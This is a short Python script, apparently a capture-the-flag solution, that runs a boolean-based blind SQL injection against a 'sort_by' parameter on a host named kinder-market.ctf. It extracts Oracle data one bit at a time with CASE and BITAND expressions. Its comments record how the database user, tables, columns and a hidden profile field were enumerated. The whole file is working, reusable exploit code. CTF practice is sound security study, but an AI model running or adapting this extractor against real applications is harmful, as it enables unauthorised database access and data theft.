import requests

host = f"http://kinder-market.ctf"

def do_sql_extract(in_str):
    url = host
    params = {"sort_by":in_str}
    r = requests.get(url,params=params)
    output = r.text
    if 'An error occurred.' in output:
        print('error')
        exit()
    if "Valerie" in output:
        return True
    return False

def do_sql(query):
    pos = 1
    ret = ""
    while True:
        tmp = 0
        str_pos = str(pos)
        for x in range(8):
            mask = str(2**x)
            sql = f"(CASE WHEN (BITAND(ASCII(SUBSTR(({query}),{str_pos},1)),{mask})>0) THEN wealth ELSE age END) DESC"
            if do_sql_extract(sql):
                tmp += 2**x
        if tmp == 0:
            break
        else:
            ret += chr(tmp)
            print(ret)
            pos += 1
    return ret

if __name__ == "__main__":
    #out = do_sql("SELECT user FROM dual") # CHAL
    #out = do_sql("SELECT TABLE_NAME FROM USER_TABLES OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY") # PROFILE
    #out = do_sql("SELECT COUNT(COLUMN_NAME) FROM USER_TAB_COLUMNS WHERE TABLE_NAME = 'PROFILE'") # 8

    #for x in range(8):
    #    out = do_sql(f"SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME = 'PROFILE' OFFSET {x} ROWS FETCH NEXT 1 ROWS ONLY") # ID, NAME, DESCRIPTION, AGE, WEALTH, CREATION_DATE, PICTURE, HIDDEN
    #    print(f"\tGot: {out}")

    #out = do_sql("SELECT COUNT(NAME) FROM PROFILE") # 6
    out = do_sql("SELECT ID||'|'||NAME||'|'||DESCRIPTION||'|'||HIDDEN FROM PROFILE OFFSET 5 ROWS FETCH NEXT 1 ROWS ONLY") # <Still waiting on output>
    print(f"\tGot: {out}")
